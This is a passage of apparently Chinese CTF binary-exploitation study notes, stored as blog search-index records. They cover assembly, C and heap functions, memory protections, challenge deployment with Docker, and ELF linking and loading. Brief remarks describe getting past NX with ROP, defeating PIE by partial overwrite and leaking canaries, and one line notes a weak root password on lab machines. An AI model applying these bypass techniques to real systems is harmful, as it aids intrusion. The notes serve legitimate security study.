; 加载内存地址\rmov ; 传递内存地址中的值\rtest eax, eax ; 等价于eax \u0026 eax, 不影响eax值, 改变标志寄存器值, 判断eax是否为0, 为0则设置ZF\rpush xx ; esp先减小, 将xx的值压入栈中, 即放入esp所指地址\rcall func ; 将call的下一条命令压入栈, jmp到func地址去, call完ret时, call的下一条命令会出栈, 存入eip中执行, 而call的函数的参数仍留在了栈中\rhello: db \"hello\", 0xa ;将字符串 \"hello\" 和一个换行符存储在内存中\rlen: equ $-hello ;equ类似于定义/等于, $ 表示当前地址的符号，而 -hello 表示 len 到 hello 的距离 AVX指令集中的 SIMD(Single Instruction Mutiple Data)指令，处理 256 位 vmovdqa ymmword ptr [rcx + 60h], ymm1\r# 将ymm1寄存器中的256位数据存储到内存地址[rcx + 0x60]处 ymmword: 32字节 寄存器 rax: 64 eax: 32 ax: 16 al,ah: 8 ","date":"2024-10-09","objectID":"/pwn_note/:2:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"C #pragma once // 防止头文件被多次包含, 告诉编译器只包含该头文件一次 printf(\"123456\\r321\\n\"); // \\r用于回到当前行的开头, \\r后边的数字替代这一行最开始的相等数目的数字 // output: 321456, 隐藏了123 putchar(10); // 换行 printf(\"\\x1B[2J\\x1B[H\"); // x1B:ESC, [2J:清屏, [H:光标移至左上角 if ( v1 == -1 ) xxx; //v1为空或无效 if ( v1 == 10 ) xxx; //v1为换行符，ASCII值为10 void *ptr[2]; // 声明大小为2的指针数组 注： C 语言中字符串以\"\\x00\"结尾，篡改字符串中的\"\\x00\"可以导致泄露后续数据如 canary 值 read 函数调用的第一个参数：0 标准输入，1 标准输出，2 标准错误 main int main(void) int main(int argc, char *argv[]) = int main(int argc, char **argv) int main(int argc, char **argv, char **envp) //argc：参数计数 //argv[0]：文件路径名 //argv[1]:第一个字符串 //argv[2]:第二个字符串 //argv[argc]：NULL 内联汇编格式 asm volatile( \"instruction list\" :\"=r\"(xxx) //output :\"r(...)\" //input : ); 宏 LODWORD(v4) = 0 //初始化低32位为0 HIDWORD(v4) = 0 //初始化高32位为0 SHIDWORD(v4) //取高32位并作为有符号整数 SIGSEGV #include \u003csignal.h\u003e signal(SIGSEGV, sigsegv_handler); //使用该函数在发生segment fault时会调用自己定义的sigsegv_handler函数 // 可查看对应整数 printf(\"signal: %d\\n\", SIGABRT); // 6 printf(\"signal: %d\\n\", SIGFPE); // 8 printf(\"signal: %d\\n\", SIGILL); // 4 printf(\"signal: %d\\n\", SIGINT); // 2 printf(\"signal: %d\\n\", SIGSEGV); // 11 printf(\"signal: %d\\n\", SIGTERM); // 15 printf(\"signal: %d\\n\", SIGALRM); // 14 signal(14, timeout_func); 函数 long strtol(const char *str, char **endptr, int base); // 将str指向的字符数组转换为长整型 // endptr: 存储转换后的字符串的结束位置 // base: 转换时使用的进制 chr(i); // 将Unicode码转换为字符 atoi(\u0026buf); //将 buf 中的字符串转换为整数 getchar(); // 从标准输入读取一个字符，将其作为无符号字符强制转换为int返回 // getchar()在scanf()前，则scanf时将需要多加一个字节 __isoc99_scanf(\"%[^\\n]s\", v); // 表示输入直到回车 scanf(\"%d\", \u0026array[i]); // 当传入+或-时会跳过scanf不改变该数组中的值 strcmp(v1, v2); // 注意观察值可能在某处可泄露 strlen(s); // 字符串长度，直到空字符，不包含\\0 s = strtok(a, \" \"); // 将a字符串按\" \"分割返回第一个子字符串 int execve(const char *__path, char *const __argv[], char *const __envp[]); // glibc包装了execl(),execlp(),execle(),execv(),execvp()5个exec API, 参数区别, 最终还是execve() qmemcpy(dest_memory, source_data, size); // 将size大小的源数据放入目标内存中 堆相关 void *malloc(size_t size); /* malloc: memory allocation 分配一块至少为size字节的连续内存区域, 返回一个指向该内存的指针 n=0时返回当前系统允许的堆的最小内存块 n\u003c0时由于size_t无符号数, 申请很大内存空间, 一般会失败 */ void *calloc(size_t nmemb, size_t size); /* calloc: 动态分配内存并初始化其内容为零, 分配nmemb个元素, 每个大小size字节 清空chunk上内容，且不从tcache中拿chunk，但free默认先往tcache放 */ void *realloc(void *ptr, size_t size); /* realloc: 重新分配之前通过malloc/calloc/realloc分配的内存区域，可以改变内存块大小，释放和分配内存块 ptr指向内存块，size为新内存块大小 ptr不为空，size=0: 释放原来的堆块, 等价于free ptr为空，size\u003e0: 等价于malloc ptr不为空，size大于原来堆块大小: 若该堆块后的堆块空闲则合并堆块，否则释放原堆块，申请一个更大堆块，原堆块内容拷贝过去 ptr不为空，size不大于原来堆块大小: 若切割后剩下堆块大于等于MINSIZE，则切割并释放，返回原堆块 */ void free(void *ptr); /* 释放ptr指向的内存块，ptr为空指针，不执行任何操作；ptr已被释放，再释放导致double free */ int mallopt(int param, int value); /* 控制堆的特定参数来改变堆分配策略 param: - M_MXFAST: 设置 malloc 用于小块内存分配的最大 fast bin 大小 - M_TRIM_THRESHOLD: 设置 sbrk 释放内存回操作系统的阈值 - M_TOP_PAD: 设置 sbrk 请求额外内存时，上面的额外内存量 - M_MMAP_THRESHOLD: 设置使用 mmap 进行内存分配的阈值 - M_MMAP_MAX: 设置可以使用 mmap 进行内存分配的最大数目 value: 新值 返回非0:成功, 0:失败 */ mmap // 文件或设备的内容映射到内存地址空间 或 分配匿名共享内存 void *mmap(void addr[.length], size_t length, int prot, int flags,int fd, off_t offset); // addr: 映射的起始地址, 传入NULL则OS自动选择 // length: 映射长度, 单位: 字节 // prot: 映射内存的保护模式 PROT_READ 1读 PROT_WRITE 2写 PROT_EXEC 4执行 // flags : 映射的类型, 对映射同一区域的其他进程是否可见 // fd: 文件描述符, 0,-1表示匿名映射: 通常用于分配内存 // offset: 文件偏移量, 从文件该位置开始映射 // 使用 mmap 分配内存 需要用对应的标志的值进行异或! https://sites.uclouvain.be/SystInfo/usr/include/bits/mman.h.html void *mapped_memory = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); // 文件映射到内存, mapped为指向该映射内存地址起点的指针, 失败则返回MAP_FAILED(-1) void *mapped = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0); 动态加载库 #include\u003cdlfcn.h\u003e int (*pFunc) (char *str); // 函数指针 void *phandle = NULL; phandle = dlopen(\"./xxx.so\", RTLD_LAZY); // 打开动态链接库 pFunc = dlsym(phandle, \"func_name\"); // 获得函数地址直接使用pFunc dlclose(phandle); // 关闭动态加载库 ","date":"2024-10-09","objectID":"/pwn_note/:2:5","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"C++ vptr = operator new(std::size_t size); // 不调用构造函数，仅分配内存空间 std::string::basic_string(input); // 将input初始化为string对象 std::ostream::operator\u003c\u003c(xxx); // 写入ostream 文件 std::ofstream::basic_ofstream(); // 创建文件输出流, 写入文件 std::ofstream::is_open(\"xxx\"); // 判断是否打开文件 std::ifstream::basic_ifstream(v, \"xx\", 8LL); // 打开文件 if ( !std::ifstream::is_open(v) ) // 判断是否打开 std::istream::operator\u003e\u003e(v, a); // 将文件内容读取到内存地址a中 虚函数 // 虚函数占用类A对象内存空间 class A{ public: // void *vptr; // 虚函数表指针 virtual void vfunc(){} virtual ~A(){} A(){ vptr = \u0026A::vftable; // 编译阶段自动为构造函数加入, 使vptr指向类A的虚函数表virtual table } private: int a; }; ","date":"2024-10-09","objectID":"/pwn_note/:2:6","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Python 小的匿名函数 xx = lambda arg1,arg2:expression xx(x1,x2) 解释器 # 开头 #!/usr/local/bin/python or #!/usr/bin/env python 调试器 python -m ipdb x.py # l: 显示所有代码 s: 单步调试 restart: 重启 c: 继续 q: 退出 b num: 下断点到 num 行 # p variable 查看变量值 p locals() 返回所有值的字典 检测器 pyflakes \u003cfile.py\u003e # 可以检查错误 mypy \u003cfile.py\u003e # 静态类型检查器 性能分析 python -m cProfile -s tottime command.py # 使用cProfile分析, 总时间进行排序 python -m memory_profiler x.py # 查看代码内存使用情况 字节串 s.replace(b'a', b'c') # 字节串替换 a 替换为 c str_s.decode('utf-8').strip('x') # 字节串转换为字符串, 并去除两端的'x' eval(s_str) # 执行字符串中的运算式 ","date":"2024-10-09","objectID":"/pwn_note/:2:7","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"保护措施 The NX bits No-eXecute，编译时决定是否生效，操作系统实现，在内存页的标识中增加“执行”位，可表示该内存页是否可以执行——无法向栈写 shellcode，栈不可执行，无法使用 shellcode，可利用 ROP 绕过 ASLR Address Space Layout Randomization：地址空间分布随机化，系统级别随机化，影响 ELF 的加载地址，使得地址每次加载都随机不同 程序装载时生效 /proc/sys/kernel/randomize_va_space = 0：无随机化 /proc/sys/kernel/randomize_va_space = 1：部分随机化，共享库、栈、mmap()、VDSO随机化 /proc/sys/kernel/randomize_va_space = 2：完全随机化，部分随机化基础上，通过brk()分配的堆内存空间也随机化 会在 For Kernel 下开始偏移随机的量，使得栈的起始地址随机 PIE position-independent executable，地址无关可执行，每次加载程序时都变换加载地址，不开则加载到固定位置，针对主模块的随机，针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术 注： 在 IDA 中会发现地址均为偏移地址，于是不能通过 ROPgadget 帮助解题 绕过：部分写地址，利用栈上已有的地址，只修改最后两个字节，因为地址最后三个数字就是实际地址的最后三个数字 区别 关闭 PIE 关闭 ASLR：主模块加载地址固定（0x400000）所有模块加载地址固定 开启 ASLR：主模块加载地址固定（0x400000） 其他模块加载地址不固定 开启 PIE 关闭 ASLR：所有模块加载地址固定 主模块地址（主模块基址 0x55xxxxxxxxxx 且固定) 开启 ASLR：所有模块加载地址不固定 Canary 有 canary 栈溢出无法执行，在函数入口处从 fs(32 位)/gs(64 位)寄存器偏移处读取一个值，实际读取 TLS 中的stack_guard，IDA 中可分析识别出 canary unsigned __int64 v4; // [rsp+108h] [rbp-20h] v4 = __readfsqword(0x28u);//表示在栈上放置一个Canary return __readfsqword(0x28u) ^ v4;//为0才会通过检查 return address previous ebp ebp canary 执行 ret 前检查 canary …… s esp 若 Canary 值被改变，则会触发：__stack_chk_fail 函数 RELRO （Relocation Read Only：重定位表（即.got 和.plt 表）只读） No relro：got 表可写，（init.array、fini.array、got.plt均可读可写） 部分 relro：got 表可写，（ini.array、fini.array可读不可写，got.plt可读可写） 完全 relro：got 表不可写，只读，无法被覆盖，大大增加程序启动时间（均不可写） RWX checksec 查看可读可写可执行的区域：Has RWX segments ","date":"2024-10-09","objectID":"/pwn_note/:2:8","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"问题解决 报错：Unexpected entries in the PLT stub. The file might have been modified after linking 下载 https://github.com/veritas501/pltresolver 到 plugins 文件夹中，然后键盘输入 Ctrl+Shift+J 反汇编失败：Decompilation failure:8048998: call analysis failed Edit - Patch program - Assemble 改为 nop 报错如下： W: GPG 错误：https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY 3B4FE6ACC0B21F32 E: 仓库 “https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security InRelease” 没有数字签名。 N: 无法安全地用该源进行更新，所以默认禁用该源。 解决: sudo apt-key adv --keyserver ``keyserver.ubuntu.com`` --recv-keys 3B4FE6ACC0B21F32 ","date":"2024-10-09","objectID":"/pwn_note/:2:9","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"出题 gcc 编译 pwn 题时： NX：-z execstack / -z noexecstack (关闭 / 开启) 不让执行栈上的数据，于是 JMP ESP 就不能用了 Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 栈里插入 cookie 信息 PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有 get_pc_thunk RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对 GOT 表是否具有写权限 Arch：-m32对文件进行 32 位的编译，-m64进行 64 位编译 使用ctf_xinetd 项目搭建部署 pwn 出题环境，尝试了多题部署但最终未能实现，于是转向单题部署且能打通 test1 部署过程 git clone https://github.com/Eadom/ctf_xinetd #把flag和二进制程序放入bin目录中，并且按照readme修改ctf.xinetd #在ctf_xinetd目录下构建容器 docker build -t \"pwn\" . #运行该镜像(pub_port: 想要放置的端口) docker run -d -p \"0.0.0.0:pub_port:9999\" -h \"pwn\" --name=\"pwn\" pwn 相关命令 # 查看端口连接： sudo netstat -antp | grep docker # 查看连接所在进程： sudo lsof -i:[port_number] # 断开连接： sudo kill -9 [PID] # 关闭docker docker kill [PID] 出现镜像冲突 docker ps -a docker rm [CONTAINER ID] 2 台 pwn 机 su root 密码更改为了 123456 出题时要考虑 setbuf(stdin, 0); setbuf(stdout, 0); fflush(stdout); //手动刷新缓冲区，将缓冲区输出到屏幕 ","date":"2024-10-09","objectID":"/pwn_note/:2:10","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ELF 文件 Executable and Linking Format 可执行和链接的文件格式，其文件结构、常数、变量类型定义在/usr/include/elf.h中 可执行程序 动态链接库 静态链接库 Windows PE .exe .dll .lib Linux ELF .out .so .a ELF 文件类型 可执行文件ET_EXEC：可直接执行，在操作系统运行 共享目标文件ET_DYN：可被动态链接的共享库，运行时与其他程序动态链接，后缀.so 可重定位文件ET_REL：编译器生成的目标文件，用于将多个目标文件链接到一个可执行文件或共享库中，后缀.o，静态链接库.a也可归为该类 核心转储文件ET_CORE：操作系统在程序崩溃或错误生成的快照，用于调试 文件头 ELF header 记录 ELF 文件组织结构，32 位为例 /* The ELF file header. This appears at the start of every ELF file. */ #define EI_NIDENT (16) typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ /* 1-4 bytes: ELFMAG即x7fELF 5 byte: ELF文件类型-\u003eELFCLASS32(1)32位, ELFCLASS64(2)64位 6 byte: ELF字节序, 0无效格式, 1小端, 2大端 7 byte: ELF版本, 1即1.2版本 8-16 bytes: 无定义0 */ Elf32_Half e_type; /* Object file type ELF 文件类型 */ Elf32_Half e_machine; /* Architecture EM_开头*/ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address 程序入口*/ /* RVA:内存中地址相对于模块基址的偏移; FOA:文件中某数据相对于文件开头的偏移 */ Elf32_Off e_phoff; /* Program header table file offset 程序头表的文件偏移*/ Elf32_Off e_shoff; /* Section header table file offset 节表的文件偏移*/ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes ELF文件头大小*/ // 程序头表 Elf32_Half e_phentsize; /* Program header table entry size 每个表项大小*/ Elf32_Half e_phnum; /* Program header table entry count 表项数量*/ // 节表 Elf32_Half e_shentsize; /* Section header table entry size 每个表项大小*/ Elf32_Half e_shnum; /* Section header table entry count 表项数量*/ Elf32_Half e_shstrndx; /* Section header string table index 字符串表的索引*/ } Elf32_Ehdr; 程序头表 Program header table 告诉系统如何创建进程，可执行文件、共享库文件有，目标文件没有，由Elf*_Phdr组成的数组 /* Program segment header. */ typedef struct { Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address ELF还没装载不知道物理地址作为保留字段, 通常和p_vaddr一样*/ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags 可读可写可执行等*/ Elf32_Word p_align; /* Segment alignment */ } Elf32_Phdr; 节头表 Section header table 记录 ELF 节区信息，用于链接的目标文件必须拥有此结构，固定长度的Elf*_Shdr结构体数组用来存放节相关信息 /* Section header. */ typedef struct { Elf32_Word sh_name; /* Section name(string tbl index)节名在字符串表中索引*/ Elf32_Word sh_type; /* Section type 节类型*/ //SHT_PROGBITS(1)代码段, SHT_PROGBITS(2)数据段, SHT_SYMTAB(2)符号表, SHT_STRTAB(3)字符串表 Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution 指定了节在可执行文件内存中加载地址*/ Elf32_Off sh_offset; /* Section file offset 节在文件中偏移量*/ Elf32_Word sh_size; /* Section size in bytes 节大小*/ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */ } Elf32_Shdr; 段（segment）与节（section) 段：用于进程的内存区域的 rwx 权限划分，在加载和执行时被 OS 来管理内存和地址映射，提供对应虚拟内存的逻辑映射 节：不参与内存的加载和执行，而用于链接器 Linker 和调试器 Debugger 对文件符号解析即重定位操作，提供对应文件的逻辑映射 代码段 Text Segment 包含函数代码与只读数据 .text节：代码节，存储程序可执行指令 .rodata节：read only 只读数据节，只读常量 .hash节 .dynsym节 .dynstr节 .plt节（Procedure Linkage Table, 进程链接表）：包含一些代码 调用链接器来解析某个外部函数的地址, 并填充到.got.plt 中, 然后跳转到该函数 直接在.got.plt 中查找并跳转到对应外部函数(如果已经填充过) .rel.got节 数据段 Data Segment 包含可读可写数据 .data节：已初始化的全局变量、静态变量，占用文件实际内存空间 .dynamic节：动态节，存储动态链接信息，包括动态链接器需要的重定位表位置、依赖的共享对象名称、共享对象初始化代码的地址、动态链接符号表的位置、版本信息等 .got节 .got.plt节（.plt 的 GOT 全局偏移表）：保存全局函数真实地址 如果在之前查找过该符号，内容为外部函数的具体地址 如果没查找过, 则内容为跳转回.plt 的代码, 并执行查找 .bss节：（Block Started by Symbol）未初始化的全局变量和静态变量，不占用文件实际内存空间，运行才分配空间初始化为 0 栈段 Stack Segment 局部变量，指针 链接相关节 静态链接相关 .symtab节：符号表节，存储符号表信息：函数、变量、其他符号的名称、类型、地址等 .strtab节：字符串表节，存储字符串数据：节名称、符号名称，被多个其他节引用 .rel.text或.rela.text节：代码重定位节，链接时修正代码中符号引用 .rel.data或.rela.data节：数据重定位节，链接时修正数据段中符号引用 其他 .note节：注释节，存储注释或调试信息 动态链接相关 .interp节：解释器 interpreter，保存字符串/lib64/ld-linux-x86-64.so.2，可执行文件所需动态链接器路径 .dynamic节：由ELF*_Dyn组成的结构体数组 /* Dynamic section entry. 64位区别 Sxword, Xword */ typedef struct{ Elf32_Sword d_tag; /* Dynamic","date":"2024-10-09","objectID":"/pwn_note/:3:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"共享库 命名规则：libname.so.x.y.z，xyz:主版本号、次版本号、发布版本号 SO-NAME 每个共享库都有一个对应的 SO-NAME，依赖某个共享库的模块在编译、链接和运行时使用共享库的 SO-NAME 而不使用详细版本号 系统会为每个共享库在它所在的目录创建一个跟 SO-NAME 相同的并且指向它的软链接（Symbol Link） 稍高版本的 libc 的 libc.so.6 本身就是动态库，不是符号链接，动态链接文件中 .dynamic 段中 DT_NEED 类型字段就是 SO-NAME # 动态库 $ ls -l /lib/x86_64-linux-gnu/libc.so.6 lrwxrwxrwx 1 root root 12 May 1 2024 /lib/x86_64-linux-gnu/libc.so.6 -\u003e libc-2.31.so # glibc 2.31 -rwxr-xr-x 1 root root 2029592 May 1 2024 /lib/x86_64-linux-gnu/libc-2.31.so -rwxr-xr-x 1 root root 2125328 8月 8 22:47 /lib/x86_64-linux-gnu/libc.so.6 # glibc 2.39 # 动态链接器 $ ls -al /lib64/ld-linux-x86-64.so.2 lrwxrwxrwx 1 root root 32 May 1 2024 /lib64/ld-linux-x86-64.so.2 -\u003e /lib/x86_64-linux-gnu/ld-2.31.so lrwxrwxrwx 1 root root 44 8月 8 22:47 /lib64/ld-linux-x86-64.so.2 -\u003e ../lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 共享库系统路径 /lib：包含 OS 核心组件所需共享库文件，与内核相关 /usr/lib：包含 OS 提供的额外共享库文件，GUI、网络库、数据库驱动程序 /usr/local/lib：安装本地软件库文件默认位置，用户手动编译安装软件 更改共享库 环境变量 LD_LIBRARY_PATH：为进程设置，则启动时动态链接器会首先查找该环境变量指定的目录，会导致地址布局差异 sh = process(\"./lib/ld.so --preload libdl.so.2 ./pwn\".split(), env={\"LD_LIBRARY_PATH\": \"./lib/\"}) LD_PRELOAD：指定预先装载的共享库，无论是否依赖都装载，也会导致地址布局差异 process(\"./lib/ld.so ./pwn\".split(), env={\"LD_PRELOAD\": \"./lib/libc.so.6\"}) LD_DEBUG：可以打开动态链接器的调试功能 ","date":"2024-10-09","objectID":"/pwn_note/:4:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"进程 ","date":"2024-10-09","objectID":"/pwn_note/:5:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"编译 广义编译包括： 预处理/预编译：处理# 开始的预编译指令 gcc -E hello.c -o hello.i # C++中.cpp/.cxx/.hpp预编译为.ii cpp hello.c \u003e hello.i 删除#define，展开所有宏定义 处理条件预编译指令#if, #ifdef, #elif, #else, #endif 处理#include，将被包含文件递归插入到该位置 删除所有注释//, /* */ 添加行号和文件名标识，保留所有#pragma 编译：将预处理后文件进行词法分析、语法分析、语义分析、优化后产生汇编代码 gcc -S hello.i -o hello.s -masm=intel # 指定汇编风格 汇编：汇编代码转换为机器码 as hello.s -o hello.o gcc -c hello.c -o hello.o # 可重定位文件/目标文件 ","date":"2024-10-09","objectID":"/pwn_note/:5:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"链接 将多个目标文件及库文件生成最终可执行文件或共享库 静态链接 ld a.o b.o -o ab gcc a.o b.o -o out.elf 合并代码和数据段 多个目标文件中代码段和数据段合并成一个 符号解析 链接器通过重定位表解析目标文件中包含的对其他目标文件或库中定义的符号引用，修复对应机器码 需要重定位的 ELF 都有对应重定位段，.text有.rel.text，.data有.rel.data 通过Elf32_Rel： ``r_offset`加上段起始得到重定位入口位置 r_info低 8 位得重定位类型 r_info高 24 位得到重定位符号在符号表.symtab中的下标 符号重定位 Elf32_Rel中st_value表示符号在段中偏移，根据重定位类型计算入口需要修正的值并修正 32 位常用重定位类型： R_386_32：绝对地址 R_386_PC32：相对当前指令地址的下一条指令相对地址 解析库依赖关系 目标文件依赖于外部库（标准/第三方），将所需的库文件链接到最终可执行文件中 /lib/x86_64-linux-gnu/libc.a # 包含多个.o文件 生成重定位表 每次程序地址加载变化，需要生成重定位表，以便在可执行文件在加载和执行时进行正确的符号重定位 动态链接 运行时才链接 装载时重定位 加载时将模块中相关地址修改为正确的值，模块装载到不同位置会导致模块代码段内容改变，无法实现共享库复用，浪费内存 地址无关代码(PIC, Position-independent Code) 把指令中那些需要被修改的部分分离，与数据部分放一起，指令部分保持不变，数据部分每个进程拥有一个副本 模块内部函数调用、数据访问：[rip + xxx]实现引用 模块间函数调用、数据访问：数据段建立一个指向变量的指针数组全局偏移表(Global Offset Table, GOT)， 共享模块被加载，若某全局变量在可执行文件中拥有副本，动态链接器把 GOT 中相应地址指向该副本，若变量在共享模块被初始化，动态链接器需将该初始化值复制到程序主模块中的变量副本 若该全局变量在主模块中无副本，GOT 相应地址指向共享模块内部的该变量副本 延迟绑定 当函数第一次被用到时才由动态链接器进行绑定（符号查找、重定位等） link_map：保存进程载入的动态链接库 dl_runtime_resolve：装载器中用于解析动态链接库中函数的实际地址的函数 .text节中调用 libc 动态链接库中 puts 函数call puts@plt，取代码段中.plt节(plt 表中每一项是一个调用函数的表项) 首次调用 puts 函数 跳转到.plt中 puts 表项 【jmp *(puts@GOT)】跳转到.got.plt中记录的地址 .got.plt未解析该函数地址，存的是.plt对应函数地址【puts@plt+\"1\"/6】，跳回.plt中 执行【push index】和【jmp PLT0】，index 是 puts 在 plt 表中对应索引 跳转到 PLT0 执行【push *(GOT+4)】，表示用到哪个动态链接库link_map，执行【jmp *(GOT+8)】跳到 GOT 表 进入_dl_runtime_resolve函数解析 puts 函数实际地址 用第一个参数link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt指针，分别运算求出符号名字符串指针、当前符号表项指针、当前函数重定位表项指针 动态链接库查找该函数地址 填入到.got.plt中 调用 puts 函数 再次调用 puts 函数 跳转到.plt中 puts 表项 跳转到.got.plt 从.got.plt跳转到puts真实地址 动态链接过程 动态链接器自举：自身重定位，OS 将进程控制权交给动态链接器，自举代码找自己的 GOT，第一个入口即为.dynamic段，获取本身的重定位表和符号表，进行重定位 装载共享对象：动态链接器将可执行文件和本身符号表合并为全局符号表，然后寻找共享对象，将其名字放入装载集合中，找到相应文件读取 ELF 文件头和.dynamic段的相应代码段和数据段映射到进程空间 重定位和初始化：重新遍历可执行文件和每个共享对象的重定位表，修正 GOT/PLT 中位置；若共享对象有.init段，动态链接器执行实现对象中 C++全局/静态对象构造初始化，.fini段用于进程退出实现 C++全局对象析构操作，不执行进程可执行文件的.init段 ","date":"2024-10-09","objectID":"/pwn_note/:5:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"装载 输入./elf，用户层 bash 进程调用fork()系统调用创建新进程，新进程调用execve()系统调用执行 elf 文件，以全新程序替代当前运行程序；原先 bash 进程返回等待新进程结束后，继续等待用户命令 内核开始装载，execve()对应入口是sys_execve()检查参数 调用do_execve()查找被执行文件，找到后读取前 128 字节判断文件格式，头 4 个字节为魔数：ELF 头x7felf，Java 可执行文件头cafe，Shell/python 等解释型语言第一行#!/bin/sh或#!/usr/bin/python 调用search_binary_handle搜索匹配合适可执行文件装载处理过程并调用：ELF可执行文件对应load_elf_binary()，a.out可执行文件对应load_aout_binary，可执行脚本程序对应load_script 检查 ELF 文件格式有效性：魔数、段数量 找动态链接的.interp段设置动态链接器路径 根据程序头表，对 ELF 进行映射：代码、数据、只读数据 初始化进程环境 系统调用返回地址修改为 ELF 入口地址【静态链接入口是文件头e_entry所指地址；动态链接入口是动态链接器 ld】 load_XX函数执行完毕返回最初sys_execve()返回用户态，EIP 寄存器跳转到 ELF 程序入口地址，执行新程序 ","date":"2024-10-09","objectID":"/pwn_note/:5:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"执行 初始化栈 OS 在进程启动前将系统环境变量和进程运行参数提前保存在进程虚拟空间栈中，静态程序_start处寄存器基本为 0，动态程序寄存器大多为垃圾数据 rsp 指向命令行参数个数【argc】 指向各个命令行参数字符串的指针数组【argv】，以 0 结尾 指向环境变量字符串的指针数组【envp】，以 0 结尾 辅助向量信息数组：OS 将其提供给动态链接器 typedef struct{ uint32_t a_type; /* Entry type 辅助向量的条目类型 */ // 可执行文件文件描述符，程序头表地址及每个条目大小、条目数量，页面大小，共享对象基址，OS标志位，程序入口地址 union{ uint32_t a_val; /* Integer value 辅助向量的值 */ } a_un; } Elf32_auxv_t; 运行程序时，shell 调用 linux 系统调用 execve() 设置一个堆栈，将 argc 、 argv 和 envp 压入其中 文件描述 0、1 和 2（stdin 、stdout 、stderr）保留为 shell 设置的值，动态链接器完成重定位工作 调用 _start() 设置 ___libc_start_main 函数所需参数 STATIC int LIBC_START_MAIN (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL), // main函数 int argc, char **argv, __typeof (main) init, // main 调用前的初始化工作, 默认是 __libc_csu_init 函数指针 void (*fini) (void), // main 结束后的收尾工作, 默认是 __libc_csu_fini 函数指针 void (*rtld_fini) (void), // 动态加载有关的收尾工作, 动态链接默认是 _dl_fini 函数指针 void *stack_end) // 栈底的地址 __libc_start_main：csu/libc-start.c中 __libc_csu_init： csu/elf-init.c中 linux 程序执行流程： 内核执行过程：sys_execve() -\u003e do_execve_common() -\u003e search_binary_handler() -\u003e load_elf_binary() -\u003e create_elf_tables()，create_elf_tables()会添加辅助向量条目 NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE); NEW_AUX_ENT(AT_PHDR, load_addr + exec-\u003ee_phoff); NEW_AUX_ENT(AT_PHENT, sizeof(struct elf_phdr)); NEW_AUX_ENT(AT_PHNUM, exec-\u003ee_phnum); NEW_AUX_ENT(AT_BASE, interp_load_addr); NEW_AUX_ENT(AT_ENTRY, exec-\u003ee_entry); ","date":"2024-10-09","objectID":"/pwn_note/:5:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"虚拟空间 虚拟内存 mmap 段中的动态链接库仅在物理内存中装载一份 每个进程有自己虚拟地址空间，由连续虚拟地址组成，不直接访问物理内存地址 OS 将其分为多个区域【代码段：可执行程序机器指令；数据段：静态及全局变量.bss .data ...；动态链接段】 加载器将这些短从 ELF 文件复制到相应虚拟内存地址，通过页表建立虚拟和物理内存地址映射关系 ","date":"2024-10-09","objectID":"/pwn_note/:5:5","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"TLS 结构体 线程可访问进程内存所有数据，全局变量若用__thread修饰则为线程私有的 TLS 数据，即每个线程都在自己所属 TLS 中单独存一份该变量副本 私有数据：局部变量、函数参数、TLS 数据（线程局部存储 Thread Local Storage） 共享数据：全局变量、堆上数据、函数中静态变量、程序代码、打开文件 .tdata节记录已初始化的 TLS 数据；.tbss节记录未初始化的 TLS 数据，ELF 中不占空间 2 节加载到内存中合并为一个段程序头表中这个段的 p_type 为 PT_TLS(7) 每一个线程中每一个使用了 TLS 功能的模块都拥有一个 TLS Block，dtv 数组中的每一项都是 TLS Block 的入口，程序使用 dlopen 函数或者 dlfree 函数加载或者卸载一个具备 TLS 变量的模块 主线程 TLS 初始化： main 开始前调用 __libc_setup_tls 